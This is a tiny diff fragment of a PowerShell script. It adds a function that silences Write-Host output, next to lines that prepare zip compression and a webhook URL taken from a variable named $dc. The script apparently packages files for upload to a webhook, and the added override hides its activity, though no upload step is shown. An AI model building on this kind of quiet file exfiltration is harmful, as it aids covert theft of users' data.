@@ -1,3 +1,5 @@
+function Write-Host { param([Parameter(ValueFromRemainingArguments=$true)]$args) }
+
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $WebhookUrl = $dc
 $MaxZipSize = 10MB
